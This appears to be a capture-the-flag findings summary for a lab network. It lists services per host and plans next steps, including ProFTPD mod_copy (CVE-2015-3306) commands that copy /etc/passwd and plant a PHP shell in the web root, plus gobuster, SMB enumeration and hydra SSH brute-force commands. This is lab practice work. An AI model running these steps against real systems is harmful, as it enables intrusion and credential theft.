# CTF Findings Summary

## Flag Found
✅ **CSEC-3961-QOTD** - Found on 10.12.0.136:17 (QOTD service)

**Hint from QOTD service:**
> "This looks like a new, fully patched system. Maybe there is a vulnerable, 3rd party service installed instead."

This hint suggests focusing on third-party applications rather than the OS itself.

---

## Key Vulnerabilities to Exploit

### 1. 10.12.0.42 - ProFTPD 1.3.5 (CRITICAL)
**ProFTPD 1.3.5** has a known vulnerability:
- **CVE-2015-3306** - mod_copy module command execution
- This allows arbitrary file copy operations that can lead to RCE

**Exploitation:**
1. Check if mod_copy is enabled (SITE CPFR/CPTO commands)
2. Copy files to web-accessible directories
3. Execute PHP/shell scripts via web server

**Commands to try:**
```bash
# Check mod_copy
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/test.txt

# If web server is accessible, copy PHP shell
SITE CPFR /path/to/shell.php
SITE CPTO /var/www/html/shell.php
```

### 2. 10.12.0.42 - nginx 1.18.0
- Check for directory traversal
- Check for default/backup files
- Directory brute forcing needed

### 3. 10.12.0.111 - IIS 10.0 on port 8080
- Check for PUT method (file upload)
- Check for web application vulnerabilities
- Directory brute forcing needed

### 4. 10.12.0.111 - SMB (port 139)
- Enumeration with smbclient
- Check for anonymous access
- Check for shares with sensitive data

### 5. 10.12.0.136 - RDP (port 3389)
- Try common credentials
- Check for BlueKeep if older Windows version

### 6. 10.12.0.194 - Apache 2.4.29
- Directory brute forcing
- Check for .htaccess misconfigurations
- Check for web application vulnerabilities

---

## Next Steps

### Immediate Actions:
1. **Exploit ProFTPD on 10.12.0.42**
   - Test mod_copy vulnerability
   - Get initial access
   - Look for flag files

2. **Enumerate web services**
   - Use gobuster/dirb on all HTTP services
   - Look for flag.txt, flag, flags files
   - Check for web shells or file uploads

3. **Enumerate SMB on 10.12.0.111**
   - Check for anonymous access
   - List shares
   - Download any flag files

4. **Check other informational ports on 10.12.0.136**
   - Ports 7, 9, 13, 19 might have additional hints

### Tools to Use:
```bash
# Web directory brute forcing
gobuster dir -u http://10.12.0.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://10.12.0.111:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://10.12.0.194 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# SMB enumeration
smbclient -L //10.12.0.111
enum4linux -a 10.12.0.111

# FTP exploitation
# Use metasploit or custom script for ProFTPD mod_copy

# SSH brute forcing (if needed)
hydra -L users.txt -P passwords.txt ssh://10.12.0.42
hydra -L users.txt -P passwords.txt ssh://10.12.0.194
```

---

## Flag Locations to Check

Based on CTF conventions, flags are typically in:
- `/flag.txt`
- `/root/flag.txt`
- `/home/*/flag.txt`
- `/var/www/html/flag.txt`
- `C:\flag.txt`
- `C:\Users\*\flag.txt`
- `C:\Users\*\Desktop\flag.txt`

---

## Notes
- Systems are independent - can work on them in parallel
- 3 flags per system (enumeration, user, root)
- Be careful not to lock yourself out
- Document all findings and methods used
